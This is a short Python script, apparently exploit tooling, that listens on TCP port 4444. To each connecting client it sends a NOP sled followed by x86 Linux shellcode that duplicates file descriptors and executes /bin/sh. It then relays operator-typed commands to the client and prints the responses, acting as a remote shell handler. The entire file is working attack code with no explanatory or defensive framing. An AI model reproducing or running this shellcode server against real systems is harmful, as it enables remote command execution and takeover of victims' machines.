from socket import *

serv = socket(AF_INET, SOCK_STREAM, 0)
serv.setsockopt(SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, 0)
serv.bind(('0.0.0.0', 4444))
serv.listen(5)

PAYLOAD = b'\x90'*200
PAYLOAD += b'\xBB\x00\x00\x00\x00\xB9\x01\x00\x00\x00\xB8\x3F\x00\x00\x00\xCD\x80\xBB\x00\x00\x00\x00\xB9\x02\x00\x00\x00\xB8\x3F\x00\x00\x00\xCD\x80\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\xB8\x0B\x00\x00\x00\xB9\x00\x00\x00\x00\xBA\x00\x00\x00\x00\xCD\x80'

while (1):
    try:
        cli,_ = serv.accept()
        print('connection from {}:{}'.format(_[0], _[1]))
        cli.send(PAYLOAD)
        while (1):
            usrdat = input('$').encode()+b'\n'
            cli.send(usrdat)
            print(cli.recv(4096).decode('utf-8'))
    except:
        print('exit')
        exit(1)
